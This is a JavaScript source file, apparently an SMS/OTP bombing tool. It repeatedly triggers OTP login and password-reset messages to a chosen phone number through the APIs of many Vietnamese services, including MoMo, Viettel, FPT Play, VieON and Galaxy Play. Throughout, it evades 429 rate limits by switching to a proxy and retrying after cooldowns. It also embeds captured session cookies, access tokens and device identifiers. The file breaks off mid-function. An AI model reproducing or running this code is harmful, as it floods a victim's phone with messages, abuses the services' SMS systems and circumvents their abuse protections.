const axios = require('axios');
const makeRequestWithProxy = require('./proxy')
const qs = require('qs')
async function hasaki(phoneNumber) {
    try {
        const url = `https://hasaki.vn/ajax?api=user.verifyUserName&username=${phoneNumber}`;
        const method = 'POST';
        const data = { msisdn: phoneNumber };
        const headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        };

        const result = await makeRequestWithProxy(url, method, data, headers);

        if (result.data && result.data.next_time_text) {
            console.log(`Cooldown in effect: ${result.data.next_time_text}. Retrying after cooldown...`);

            function timeToMilliseconds(time) {
                const [minutes, seconds] = time.split(':').map(Number); // Tách phút và giây từ chuỗi thời gian
                const milliseconds = (minutes * 60 * 1000) + (seconds * 1000); // Chuyển đổi phút và giây thành mili giây
                return milliseconds;
            }
            const milliseconds = timeToMilliseconds(result.data.next_time_text);
            // Retry after the parsed time
            setTimeout(() => {
                hasaki(phoneNumber); // Recursively call the function after the timeout
            }, milliseconds); // Timeout based on next_time
        } else if (result) {
            console.log('Success:', result);
        } else {
            console.log('Failed to get valid response.');
        }
    } catch (error) {
        console.error('Error during Hasaki request:', error.message);
    }
}
// API requests
async function Shine(phoneNumber) {
    try {
        const response = await axios.post('https://ls6trhs5kh.execute-api.ap-southeast-1.amazonaws.com/Prod/otp/send', {
            phone: phoneNumber
        });

        if (response.data && response.data.success) {
            console.log('OTP đã được gửi thành công qua 30Shine.');
        } else {
            console.log(response.data.message || 'Lỗi không xác định');
        }
    } catch (error) {
        if (error.response && error.response.status === 429) {
            console.log('30Shine hit rate limit. Using proxy...');
            await makeRequestWithProxy('https://ls6trhs5kh.execute-api.ap-southeast-1.amazonaws.com/Prod/otp/send', 'POST', { phone: phoneNumber });
        } else {
            console.error(error.message || error);
        }
    }
}

async function Momo(phoneNumber) {
    try {
        const response = await axios.post('https://business.momo.vn/api/authentication/v1/users/password/otp?language=vi', {
            phoneNumber: phoneNumber
        });

        if (response.data && response.data.success) {
            console.log('OTP đã được gửi thành công qua MOMO.');
        } else {
            console.log(response.data.message || 'Lỗi không xác định');
        }
    } catch (error) {
        if (error.response && error.response.status === 429) {
            console.log('MOMO hit rate limit. Using proxy...');
            await makeRequestWithProxy('https://business.momo.vn/api/authentication/v1/users/password/otp?language=vi', 'POST', { phoneNumber: phoneNumber });
        } else {
            console.error(error.message || error);
        }
    }
}

async function TV360(phoneNumber) {
    try {
        // Thực hiện yêu cầu ban đầu mà không dùng proxy
        const response = await axios.post(
            'https://tv360.vn/public/v1/auth/get-otp-login',
            { msisdn: phoneNumber },
            {
                headers: {
                    'Content-Type': 'application/json',
                    'authority': 'tv360.vn',
                    'accept': 'application/json, text/plain, */*',
                    'accept-encoding': 'gzip, deflate, br, zstd',
                    'accept-language': 'vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6',
                    'origin': 'https://tv360.vn',
                    'priority': 'u=1, i',
                    'referer': 'https://tv360.vn/login?r=https%3A%2F%2Ftv360.vn%2F',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': "'Windows'",
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'tz': 'Asia/Bangkok',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
                    'Cookie': 'G_ENABLED_IDPS=google; NEXT_LOCALE=vi; _ga=GA1.1.1669752196.1725536919; _ga_D7L53J0JMS=GS1.1.1725536920.1.1.1725537043.39.0.0; _ga_E5YP28Y8EF=GS1.1.1725536920.1.1.1725537043.0.0.0; _gat_UA-180935206-1=1; _gid=GA1.2.272906048.1725536919; device-id=s%3Aweb_aa391732-e326-4548-83b1-256d0f1ad0e8.7IzqqKimmNG8ypUbJqpYBtlGebnW58Enk%2BPzFok3f4s; screen-size=s%3A1280x800.9jGmh%2FwhA6Xnw8IJ1NK75JLHqiyvSWvdx5VDHNi3S3U; session-id=s%3Aa870ce1a-308e-4e40-ac01-4515ad703e20.lWGiPYFLgsdh%2FbI7EQ9LF7dyODSO%2FpC97hdRvtqr%2BMg'
                }
            }
        );

        console.log('Response data:', response.status);

        if (response.data && response.data.success) {
            console.log('OTP has been successfully sent via TV360.');
        } else {
            console.log(response.data.message || 'Unknown error occurred.');
        }
    } catch (error) {
        if (error.response.status === 429) {
            console.log('Received 429 Too Many Requests. Retrying with proxy...');

            // Sử dụng proxy sau khi gặp lỗi 429
            try {
                const proxyResponse = await makeRequestWithProxy(
                    'https://tv360.vn/public/v1/auth/get-otp-login',
                    'POST',
                    { msisdn: phoneNumber },
                    {
                        headers: {
                            'Content-Type': 'application/json',
                            'authority': 'tv360.vn',
                            'accept': 'application/json, text/plain, */*',
                            'accept-encoding': 'gzip, deflate, br, zstd',
                            'accept-language': 'vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6',
                            'origin': 'https://tv360.vn',
                            'priority': 'u=1, i',
                            'referer': 'https://tv360.vn/login?r=https%3A%2F%2Ftv360.vn%2F',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': "'Windows'",
                            'sec-fetch-dest': 'empty',
                            'sec-fetch-mode': 'cors',
                            'tz': 'Asia/Bangkok',
                            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
                            'Cookie': 'G_ENABLED_IDPS=google; NEXT_LOCALE=vi; _ga=GA1.1.1669752196.1725536919; _ga_D7L53J0JMS=GS1.1.1725536920.1.1.1725537043.39.0.0; _ga_E5YP28Y8EF=GS1.1.1725536920.1.1.1725537043.0.0.0; _gat_UA-180935206-1=1; _gid=GA1.2.272906048.1725536919; device-id=s%3Aweb_aa391732-e326-4548-83b1-256d0f1ad0e8.7IzqqKimmNG8ypUbJqpYBtlGebnW58Enk%2BPzFok3f4s; screen-size=s%3A1280x800.9jGmh%2FwhA6Xnw8IJ1NK75JLHqiyvSWvdx5VDHNi3S3U; session-id=s%3Aa870ce1a-308e-4e40-ac01-4515ad703e20.lWGiPYFLgsdh%2FbI7EQ9LF7dyODSO%2FpC97hdRvtqr%2BMg'
                        }
                    }
                );

                console.log('Proxy Response data:', proxyResponse.data);

                if (proxyResponse.data && proxyResponse.data.success) {
                    console.log('OTP has been successfully sent via TV360 using proxy.');
                } else {
                    console.log(proxyResponse.data.message || 'Unknown error occurred after proxy.');
                }
            } catch (proxyError) {
                console.error('Error during proxy request:', proxyError.response ? proxyError.response.data : proxyError.message);
            }

        } else {
            console.error('Error details:', error.response ? error.response.data : error.message);
        }
    }
}

async function MyVietel(phoneNumber) {
    try {
        // Thực hiện yêu cầu ban đầu mà không dùng proxy
        const url = 'https://apigami.viettel.vn/mvt-api/myviettel.php/getOTPCommon';
        const headers = {
            'host': 'apigami.viettel.vn',
            'app_version': '7.11.1',
            'device_id': '163D6BDF-BBFC-4DA3-8CF6-2DB352C1F27E',
            'Accept': '*/*',
            'User-Agent': 'MyViettel/7.11.1 (iPhone; iOS 17.2.1; Scale/3.00)',
            'Accept-Language': 'vi-VN;q=1'
        }
        const data = {
            'actionCode': 'myviettel://login_mobile',
            'build_code': '2024.8.16',
            'device_id': '163D6BDF-BBFC-4DA3-8CF6-2DB352C1F27E',
            'device_name': 'iPhone (iPhone 12 Pro Max)',
            'isResetOtp': 'false',
            'myvt_checksum': 'EK111V1HgX1awpRUjQ7R31Pel9E=',
            'os_type': 'ios',
            'os_version': '17.200001',
            'phone': phoneNumber,
            'type': 'otp_login',
            'typeCode': 'DI_DONG',
            'version_app': '7.11.1'
        }
        const response = await axios.post(url, qs.stringify(data), { headers });

        if (response.data.success) {
            console.log('MyViettel', response.data);
        } else {
            console.log('MyViettel', response.data);
        }
    } catch (error) {
        // Nếu nhận được lỗi 429, thử lại với proxy
        if (error.response && error.response.status === 429) {
            console.log('Received 429 Too Many Requests. Retrying with proxy...');
            try {
                const url = 'https://apigami.viettel.vn/mvt-api/myviettel.php/getOTPCommon';
                const headers = {
                    'host': 'apigami.viettel.vn',
                    'app_version': '7.11.1',
                    'device_id': '163D6BDF-BBFC-4DA3-8CF6-2DB352C1F27E',
                    'Accept': '*/*',
                    'User-Agent': 'MyViettel/7.11.1 (iPhone; iOS 17.2.1; Scale/3.00)',
                    'Accept-Language': 'vi-VN;q=1'
                }
                const data = {
                    'actionCode': 'myviettel://login_mobile',
                    'build_code': '2024.8.16',
                    'device_id': '163D6BDF-BBFC-4DA3-8CF6-2DB352C1F27E',
                    'device_name': 'iPhone (iPhone 12 Pro Max)',
                    'isResetOtp': 'false',
                    'myvt_checksum': 'EK111V1HgX1awpRUjQ7R31Pel9E=',
                    'os_type': 'ios',
                    'os_version': '17.200001',
                    'phone': phoneNumber,
                    'type': 'otp_login',
                    'typeCode': 'DI_DONG',
                    'version_app': '7.11.1'
                }
                const proxyResponse = await makeRequestWithProxy(url, qs.stringify(data), { headers });

                if (proxyResponse.data.success) {
                    console.log(proxyResponse.data.message);
                } else {
                    console.log(proxyResponse.data.message);
                }
            } catch (proxyError) {
                console.error('Proxy Error:', proxyError.response ? proxyError.response.data : proxyError.message);
            }
        } else {
            console.error('Error:', error.message || error);
        }
    }
}

async function Futabus(phoneNumber) {
    try {
        // Thực hiện yêu cầu ban đầu mà không dùng proxy
        const response = await axios.post(
            'https://api.vato.vn/api/authenticate/request_code',
            {
                phoneNumber: phoneNumber,
                use_for: "LOGIN",
                deviceId: "1bd1ff47-dece-4b5b-8da9-677ed7b2c34e"
            },
            {
                headers: {
                    'Content-Type': 'application/json',
                }
            }
        );

        if (response.data.success || response.status === 200) {
            console.log('Response:', response.data.message);

            if (response.data.message === 'You get exceeded maximum number of requests. Please try again later.') {
                console.log('Received 429 Too Many Requests. Retrying with proxy...');
                try {
                    const proxyResponse = await makeRequestWithProxy(
                        'https://api.vato.vn/api/authenticate/request_code',
                        'POST',
                        {
                            phoneNumber: phoneNumber,
                            use_for: "LOGIN",
                            deviceId: "1bd1ff47-dece-4b5b-8da9-677ed7b2c34e"
                        },
                        {
                            headers: {
                                'Content-Type': 'application/json',
                            }
                        }
                    );

                    if (proxyResponse.data.success) {
                        console.log('Response:', proxyResponse.data);
                        // console.log(proxyResponse.data.message);
                    } else {
                        console.log(proxyResponse.data.message);


                        // console.log('Response:', proxyResponse.data);

                    }
                } catch (proxyError) {
                    console.error('Proxy Error:', proxyError.response ? proxyError.response.data : proxyError.message);
                }
            } else {
                console.log(response.data.message);
            }
        } else {
            console.log(response.data.message);
        }
    } catch (error) {
        console.error('API Error:', error.response ? error.response.data : error.message);
    }
}

async function FTPplay(phoneNumber) {
    try {
        const response = await axios.post(
            'https://api.fptplay.net/api/v7.1_w/account/otp/send',
            {
                client_id: "vKyPNd1iWHodQVknxcvZoWz74295wnk8",
                phone: phoneNumber,
                type_otp: "login_fpl",
                verify_token: "gAAAAABm2ZfefsfD4MG47frCQneJQEX0JRADq2KjDwKGOwJHFTjlYysbQi1hsY8Ad4sSXZVzOe2zrSPAEJlmuj7rdIK0qByYjxF-38N62C8wzVXOVE2VhzGfUFWzcyFhbCfqBSxZtcuXyA3NDXfxqSoTG5MakoV7IDCEtQaBsGHi-UU9qQSPqlqwBOSiBYdORo4ljKitdSGW8EvACUj6Gc8yC5yn7365r5vHtY1R6-SQnbJ9Iz4JI47-J1rQF-5sT7ap8nyER9JaPWIs6si-OIEefRt1VCYzryutC9HUraR88uea05jlq0w="
            },
            {
                params: {
                    st: "AfwzhZw9f9kIupTWl8BSxQ",
                    e: "1725539826",
                    device: "coc_coc_browser(version:133.0.0)",
                    drm: "1"
                },
                headers: {
                    'Content-Type': 'application/json',
                }
            }
        );

        if (response.data && response.data.success) {
            console.log(response.data);
        } else {
            console.log(response.data || "error");
        }
    } catch (error) {
        console.error(error.message || error);
    }
}

async function VIEON(phoneNumber) {

    const url = "https://api.vieon.vn/backend/user/v2/register?app_version=30.5.18&device_id=E252DE6D-7B77-4CAF-8D21-51A6E23EC974&device_name=Apple&device_type=app&model=iPhone%2012%20Pro%20Max&platform=ios&ui=012021";

    const headers = {
        'Host': 'api.vieon.vn',
        'accept': '*/*',
        'content-type': 'application/json',
        'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjU5NDcwNzksImp0aSI6ImFkMTkxYjJjMGJmYTVlMDU4YmFhYzNlZGJlY2QwMjY5IiwiYXVkIjoiIiwiaWF0IjoxNzI1Nzc0Mjc5LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTcyNTc3NDI3OCwic3ViIjoiYW5vbnltb3VzX0UyNTJERTZELTdCNzctNENBRi04RDIxLTUxQTZFMjNFQzk3NC1jN2Q1N2RiMjJlYzc0N2E4OGQ5ZjNiNWU0ZjZhMzk0YS0xNzI1Nzc0Mjc5Iiwic2NvcGUiOiJjbTpyZWFkIGNhczpyZWFkIGNhczp3cml0ZSBiaWxsaW5nOnJlYWQiLCJkaSI6IkUyNTJERTZELTdCNzctNENBRi04RDIxLTUxQTZFMjNFQzk3NC1jN2Q1N2RiMjJlYzc0N2E4OGQ5ZjNiNWU0ZjZhMzk0YS0xNzI1Nzc0Mjc5IiwidWEiOiJWaWVPTi8yNDA4MzEwMCBDRk5ldHdvcmsvMTQ5MC4wLjQgRGFyd2luLzIzLjIuMCIsImR0IjoiaW9zIiwibXRoIjoiYW5vbnltb3VzX2xvZ2luIiwibWQiOiJBcHBsZSIsImlzcHJlIjowLCJ2ZXJzaW9uIjoiIn0.A2Ok2Cx7veTAJJP8YDHK-64njPv23XFzfjr1_9CipaI',
        'baggage': 'sentry-environment=production,sentry-public_key=7e31b415a6c8421298d8a84ec77fbd11,sentry-release=vn.dzones.viehub%4030.5.18%2B24083100,sentry-trace_id=b6c76dfaab88400aa94593052bf953af',
        'user-agent': 'VieON/30.5.18 (vn.dzones.viehub; build:24083100; iOS 17.2.1) Alamofire/5.9.1',
        'accept-language': 'vi',
        'sentry-trace': 'b6c76dfaab88400aa94593052bf953af-50269d95224a4843-0'
    };

    const data = {
        device_id: "E252DE6D-7B77-4CAF-8D21-51A6E23EC974",
        username: phoneNumber,
        app_version: "30.5.18",
        ui: "012021",
        platform: "ios",
        device_name: "Apple",
        country_code: "VN",
        device_type: "app"
    };

    await axios.post(url, data, { headers })
        .then(response => {
            console.log('Response data:', response.data);
            if (response.data.code !== 0) {
                const url = 'https://api.vieon.vn/backend/user/v2/password/forgot?app_version=30.5.18&device_id=B4E821B2-859C-4BEC-B291-5211061B649A&device_name=Apple&device_type=app&model=iPhone%2012%20Pro%20Max&platform=ios&ui=012021'
                const headers = {
                    'Host': 'api.vieon.vn',
                    'accept': '*/*',
                    'content-type': 'application/json',
                    'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjYyMDI4ODcsImp0aSI6ImRiMjE0M2QwN2Y3M2ZjY2RjNzZmMmU2NDY0YjliN2ZmIiwiYXVkIjoiIiwiaWF0IjoxNzI2MDMwMDg3LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTcyNjAzMDA4Niwic3ViIjoiYW5vbnltb3VzX0I0RTgyMUIyLTg1OUMtNEJFQy1CMjkxLTUyMTEwNjFCNjQ5QS0zNTQyYWJiZGYxZmRmN2MyNjJjOTg1YmE0YWRmNDhjMS0xNzI2MDMwMDg3Iiwic2NvcGUiOiJjbTpyZWFkIGNhczpyZWFkIGNhczp3cml0ZSBiaWxsaW5nOnJlYWQiLCJkaSI6IkI0RTgyMUIyLTg1OUMtNEJFQy1CMjkxLTUyMTEwNjFCNjQ5QS0zNTQyYWJiZGYxZmRmN2MyNjJjOTg1YmE0YWRmNDhjMS0xNzI2MDMwMDg3IiwidWEiOiJWaWVPTi8yNDA4MzEwMCBDRk5ldHdvcmsvMTQ5MC4wLjQgRGFyd2luLzIzLjIuMCIsImR0IjoiaW9zIiwibXRoIjoiYW5vbnltb3VzX2xvZ2luIiwibWQiOiJBcHBsZSIsImlzcHJlIjowLCJ2ZXJzaW9uIjoiIn0.6_qeieimhWtw4f0jxqUKp0XB9ODZynukHZwT-vk4ht8',
                    'baggage': 'sentry-environment=production,sentry-public_key=7e31b415a6c8421298d8a84ec77fbd11,sentry-release=vn.dzones.viehub%4030.5.18%2B24083100,sentry-trace_id=62775387ae4f4dbdad7890b4c4fb2657',
                    'user-agent': 'VieON/30.5.18 (vn.dzones.viehub; build:24083100; iOS 17.2.1) Alamofire/5.9.1',
                    'accept-language': 'vi',
                    'sentry-trace': '62775387ae4f4dbdad7890b4c4fb2657-b71eaccbdf41431c-0'
                }
                const data = {
                    "platform": "ios",
                    "country_code": "VN",
                    "device_type": "app",
                    "device_name": "Apple",
                    "app_version": "30.5.18",
                    "username": phoneNumber,
                    "device_id": "B4E821B2-859C-4BEC-B291-5211061B649A",
                    "ui": "012021",
                }
                axios.post(url, data, { headers })
                    .then(response => {
                        console.log(response.data)
                    })
                    .catch(error => {
                        console.log(error)
                    })

            }
        })
        .catch(error => {
            console.error('Error:', error.response ? error.response.data : error.message);
        });

}

async function FPTPLAY2(phoneNumber) {
    const url = 'https://api.fptplay.net/api/v7.1_ios/account/otp/validate_user?device_model=iPhone%2012%20Pro%20Max&device=iPhone%2012%20Pro%20Max&device_id=22EEED3B-4C55-40F0-8576-CA1779AD9662&version=7.16.07&deviceWidth=1284&st=fY_v2p66KdPg4ejnrpRHhQ&deviceHeight=2778&osversion=17.2.1&e=1726030804&nettype=WIFI&fhd=1&drm=1'

    const headers = {
        'Host': 'api.fptplay.net',
        'content-type': 'application/json',
        'accept': '*/*',
        'x-did': '22EEED3B-4C55-40F0-8576-CA1779AD9662',
        'accept-charset': 'utf-8',
        'st': 'fY_v2p66KdPg4ejnrpRHhQ',
        'accept-language': 'vi-VN;q=1.0',
        'user-agent': 'FPT Play/7.16.07 (ftel.rad.fptplay; build:2; iOS 17.2.1) Alamofire/5.9.1',
    }
    const data = {
        "client_id": "PSQPltroF2zjsTLwopYR92P5Ay3Sa2osFXyCxmbc",
        "type": "login_fpl",
        "phone": phoneNumber
    }
    await axios.post(url, data, { headers })
        .then(response => {
            sendOTP(response.data.data.verify_token, phoneNumber)
            // console.log(response.data.data.verify_token);
            // console.log(phoneNumber)
        })
        .catch(error => {
            console.error('Error:', error.response ? error.response.data : error.message);
        })

    async function sendOTP(token, phoneNumber) {
        const url = 'https://api.fptplay.net/api/v7.1_ios/account/otp/send?fhd=1&deviceWidth=1284&deviceHeight=2778&e=1726030810&st=biKgFsjZHmBPStd-Yedrsg&device_id=22EEED3B-4C55-40F0-8576-CA1779AD9662&device=iPhone%2012%20Pro%20Max&osversion=17.2.1&nettype=WIFI&drm=1&version=7.16.07&device_model=iPhone%2012%20Pro%20Max'
        const headers = {
            'Host': 'api.fptplay.net',
            'content-type': 'application/json',
            'accept': '*/*',
            'st': 'biKgFsjZHmBPStd-Yedrsg',
            'accept-charset': 'utf-8',
            'x-did': '22EEED3B-4C55-40F0-8576-CA1779AD9662',
            'accept-language': 'vi-VN;q=1.0',
            'e': '1726030810',
            'user-agent': 'FPT Play/7.16.07 (ftel.rad.fptplay; build:2; iOS 17.2.1) Alamofire/5.9.1'
        }
        const data = {
            "phone": phoneNumber,
            "verify_token": token,
            "client_id": "PSQPltroF2zjsTLwopYR92P5Ay3Sa2osFXyCxmbc",
            "type_otp": "login_fpl"
        }
        await axios.post(url, data, { headers })
            .then(response => {
                console.log(response.data)
            })
            .catch(error => {
                console.error('Error:', error.response ? error.response.data : error.message);
            })
    }
}

async function MyTV(phoneNumber) {
    const url = 'https://meco.mytv.vn/v8/vnptid/send-otp'

    const headers = {
        'Host': 'meco.mytv.vn',
        'Accept': '*/*',
        'User-Agent': 'MyTV/2.2.3 (com.vnpt.media.mobileb2c; build:173; iOS 17.2.1) Alamofire/5.9.1',
        'Accept-Language': 'vi-VN;q=1.0'
    }
    const data = {
        'n_status': '0',
        'event_connection': '3',
        'mobile_login': phoneNumber,
        'fk': 'first#key',
        'version_number': '173',
        'uuid': '9F191F85-079A-48F4-9D8A-1F5AB8E259BE1725990330',
        'device_type': '3',
        'version_name': '2.2.3',
        'manufacturer_id': '9F191F85-079A-48F4-9D8A-1F5AB8E259BE'
    }

    axios.post(url, qs.stringify(data), { headers })
        .then(response => {
            console.log('Response:', response.data);
        })
        .catch(error => {
            console.error('Error:', error.message);
        });
}

async function GalaxyPlay(phoneNumber) {
    // Check xem số điện thoại đã có trong app chưa
    // nếu có rồi, thì gọi API quên mk
    // chưa có gửi mã otp
    const url = `https://api.glxplay.io/account/phone/checkPhoneOnly?phone=${phoneNumber}`
    const headers = {
        'Host': 'api.glxplay.io',
        'accept': '*/*',
        'access-token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiIzOWRhZjM5Yy0xNzlmLTQwY2EtOTkyOC1lNGMwMTBhMzk1OTciLCJkaWQiOiI2MDJmZjdmYi02MjJiLTRlNWYtOWYzOC0zZWZlZWVhNTVmNjEiLCJpcCI6IjE0LjIzMi42NC4xNjQiLCJtaWQiOiJFODU1RDkwRC1EOTMxLTQ5NUQtQTJDQS0zM0Q3NjA5Q0U4NzgiLCJwbHQiOiJtb2J8YXBwbGV8aW9zfDE3LjIuMXxpcGhvbmUiLCJhcHBfdmVyc2lvbiI6IjMuMTAuMTIiLCJpYXQiOjE3MjU5OTgyNDMsImV4cCI6MTc0MTU1MDI0M30.D8mKvlY_1QMFUEh2cjNrakLZBUYmocVz_4BBStSl2Ek',
        'user-agent': 'Galaxy%20Play/290724.1403 CFNetwork/1490.0.4 Darwin/23.2.0',
        'accept-language': 'vi'
    }
    const data = `https://api.glxplay.io/account/phone/checkPhoneOnly?phone=${phoneNumber}`
    await axios.post(url, data, { headers })
        .then(response => {
            console.log(response.data)
            const url = `https://api.glxplay.io/account/phone/verify?phone=${phoneNumber}&typeOtp=sms`
            const headers = {
                'Host': 'api.glxplay.io',
                'accept': '*/*',
                'access-token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiIzOWRhZjM5Yy0xNzlmLTQwY2EtOTkyOC1lNGMwMTBhMzk1OTciLCJkaWQiOiI2MDJmZjdmYi02MjJiLTRlNWYtOWYzOC0zZWZlZWVhNTVmNjEiLCJpcCI6IjE0LjIzMi42NC4xNjQiLCJtaWQiOiJFODU1RDkwRC1EOTMxLTQ5NUQtQTJDQS0zM0Q3NjA5Q0U4NzgiLCJwbHQiOiJtb2J8YXBwbGV8aW9zfDE3LjIuMXxpcGhvbmUiLCJhcHBfdmVyc2lvbiI6IjMuMTAuMTIiLCJpYXQiOjE3MjU5OTgyNDMsImV4cCI6MTc0MTU1MDI0M30.D8mKvlY_1QMFUEh2cjNrakLZBUYmocVz_4BBStSl2Ek',
                'user-agent': 'Galaxy%20Play/290724.1403 CFNetwork/1490.0.4 Darwin/23.2.0',
                'accept-language': 'vi'
            }
            const data = `https://api.glxplay.io/account/phone/verify?phone=${phoneNumber}&typeOtp=sms`
            axios.post(url, data, { headers })
                .then(response => {
                    console.log('register', response.data)
                })
                .catch(error => {
                    console.error('Error:', error.response ? error.response.data : error.message);
                })
        })
        .catch(error => {
            console.error('Error:', error.response ? error.response.data : error.message);
            const url = `https://api.glxplay.io/account/phone/forgot?phone=${phoneNumber}&typeOtp=sms`
            const headers = {
                'Host': 'api.glxplay.io',
                'accept': '*/*',
                'access-token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiIzOWRhZjM5Yy0xNzlmLTQwY2EtOTkyOC1lNGMwMTBhMzk1OTciLCJkaWQiOiI2MDJmZjdmYi02MjJiLTRlNWYtOWYzOC0zZWZlZWVhNTVmNjEiLCJpcCI6IjE0LjIzMi42NC4xNjQiLCJtaWQiOiJFODU1RDkwRC1EOTMxLTQ5NUQtQTJDQS0zM0Q3NjA5Q0U4NzgiLCJwbHQiOiJtb2J8YXBwbGV8aW9zfDE3LjIuMXxpcGhvbmUiLCJhcHBfdmVyc2lvbiI6IjMuMTAuMTIiLCJpYXQiOjE3MjU5OTgyNDMsImV4cCI6MTc0MTU1MDI0M30.D8mKvlY_1QMFUEh2cjNrakLZBUYmocVz_4BBStSl2Ek',
                'user-agent': 'Galaxy%20Play/290724.1403 CFNetwork/1490.0.4 Darwin/23.2.0',
                'accept-language': 'vi'
            }
            const data = `https://api.glxplay.io/account/phone/forgot?phone=${phoneNumber}&typeOtp=sms`
            axios.post(url, data, { headers })
                .then(response => {
                    console.log('rePass', response.data)
                })
                .catch(error => {
                    console.error('Error:', error.response ? error.response.data : error.message);
                })
        })
}

async function ONPLUS(phoneNumber) {
    // checkuser
    const url = `https://id-public-api.vinasports.com.vn/api/phone?phone=${phoneNumber}&sub_platform=2&sub_version_name=8.8.0`
    const headers = {
        'Host': 'id-public-api.vinasports.com.vn',
        'Cookie': 'NSC_WT_l8t-poqmvt=ffffffff0946145645525d5f4f58455e445a4a423660',
        'accept': '*/*',
        'version': '8.8.0',
        'accept-language': 'vn',
        'tokendevice': 'f0j2X0mtJ0CtliwUnnh_qb:APA91bEjaArC0lJZ8GPPMHW1MYJiFWxjCTNCBn6EP_MehQYW8yMPtMtEaI7ZSlsiLIQG6356Vyui9YhPPV59bwExM0pn-pQdAZoTYh8Vw96Rm75NaVtE_roz0mGOrJ65IdtiWOiNUk1i',
        'user-agent': 'ON Plus/8.8.0 (com.vtvcab.onsports; build:24081615; iOS 17.2.1) Alamofire/5.8.0'
    }
    await axios.get(url, { headers })
        .then(response => {
            console.log(response.data)
            const url = 'https://id-public-api.vinasports.com.vn/api/verify_otp?sub_platform=2&sub_version_name=8.8.0'
            const headers = {
                'Host': 'id-public-api.vinasports.com.vn',
                'Cookie': 'NSC_WT_l8t-poqmvt=ffffffff0946145645525d5f4f58455e445a4a423660',
                'content-type': 'application/json',
                'version': '8.8.0',
                'accept': '*/*',
                'accept-language': 'vn',
                'tokendevice': 'f0j2X0mtJ0CtliwUnnh_qb:APA91bEjaArC0lJZ8GPPMHW1MYJiFWxjCTNCBn6EP_MehQYW8yMPtMtEaI7ZSlsiLIQG6356Vyui9YhPPV59bwExM0pn-pQdAZoTYh8Vw96Rm75NaVtE_roz0mGOrJ65IdtiWOiNUk1i',
                'user-agent': 'ON Plus/8.8.0 (com.vtvcab.onsports; build:24081615; iOS 17.2.1) Alamofire/5.8.0'
            }
            const data = {
                'phone': phoneNumber
            }
            axios.post(url, data, { headers })
                .then(response => {
                    console.log(response.data)
                })
                .catch(error => {
                    console.error('Error:', error.response ? error.response.data : error.message);
                })
        })
        .catch(error => {
            console.error('Error:', error.response ? error.response.data : error.message);
        })
}

async function FPTSHOP(phone) {
    const url = `https://papi.fptshop.com.vn/gw/is/user/new-send-verification`
    const headers = {
        'accept': '*/*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6',
        'apptenantid': 'vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6',
        'content-type': 'application/json',
        'order-channel': '1',
        'origin': 'https://fptshop.com.vn',
        'referer': 'https://fptshop.com.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36'
    }
    const data = {
        "fromSys": "WEBKHICT",
        "otpType": "0",
        "phoneNumber": phone
    }

    await axios.post(url, data, { headers })
        .then(response => {
            console.log(response.data)
        })
        .catch(error => {
            console.error('Error:', error.response ? error.response.data : error.message);
        })

}

async function VIETTEL(phone) {
    const url = `https://apigami.viettel.vn/mvt-api/myviettel.php/getOTPLoginCommon?lang=vi&phone=${phone}&actionCode=myviettel:%2F%2Flogin_mobile&typeCode=DI_DONG&type=otp_login`
    const headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6',
        'apptenantid': 'vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6',
        'content-type': 'application/json',
        'order-channel': '1',
        'origin': 'https://www.vietteltelecom.vn',
        'referer': 'https://www.vietteltelecom.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36'
    }
    await axios.post(url, { headers })
        .then(response => {
            console.log(response.data)
        })
        .catch(error => {
            console.error('Error:', error.response ? error.response.data : error.message);
        })

}


async function POPEYES(phone) {
    const url = `https://api.popeyes.vn/api/v1/register`
    const headers = {
        'Host': 'api.popeyes.vn',
        'accept': 'application/json',
        'x-client': 'WebApp',
        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'content-type': 'application/json',
        'origin': 'https://popeyes.vn',
        'x-requested-with': 'mark.via.gp',
        'sec-fetch-site': 'same-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://popeyes.vn/',
